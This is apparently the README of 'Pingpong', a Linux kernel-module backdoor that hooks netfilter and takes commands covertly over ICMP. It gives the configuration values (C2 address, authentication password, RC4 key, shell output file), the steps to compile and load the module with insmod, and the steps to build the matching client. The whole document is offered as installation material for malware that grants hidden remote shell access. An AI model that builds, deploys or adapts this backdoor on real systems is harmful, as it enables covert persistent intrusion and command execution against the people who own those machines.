# Pingpong 
Pingpong is a backdoor that communicates entirely on icmp.

The ko directory contains code to compile a kernel module backdoor that hooks netfilter and listens for incoming icmp traffic. The client provided implements the custom protocol to communicate with the backdoor.

# Installation
Some configurations have to be added manually inside of each respective config.h file.
## KO
### Configuration
```c
#define C2_ADDR "<IP>" // Implementation to be added in the future
#define PASSWORD "<PASSWORD>" // The backdoor will only communicate with clients that have auth:ed with this password
#define RC4_KEY ((uint8_t[]){0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef}) // RC4_key, must match client
#define RC4_KEY_LENGTH 8 // must match the length of RC4_KEY byte array
```
### Compilation
Compilation has been tested on a debian 6.6.9-amd64 kernel.
#### Installing kernel headers
```bash
sudo apt update
sudo apt install build-essential
sudo apt-get install linux-headers-$(uname -r)
```
#### Compiling program
```bash
cd ko
make
sudo insmod pingpong.ko
```
## Client
### Configuration
```c
#define SRC_ADDR "<IP>" // Your Ip address
#define DST_ADDR "<IP>" // backdoors Ip address
#define INTERFACE "<INTERFACE>" // interface that your Ip address is bound to, eg 'eth0'
#define PASSWORD "<PASSWORD>" // Matching password as in the config on the server
#define OUTPUT_FILE "<PATH>" // When the 'shell' command is invoked, output is stored (and removed) to this file on the server
#define RC4_KEY ((uint8_t[]){0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef}) // RC4_key, must match ko
#define RC4_KEY_LENGTH 8 // must match the length of RC4_KEY byte array
```
### Compilation
```bash
cd client
make
sudo ./main
```

# TODO
* Add 'upload' command 
* Better encryption traffic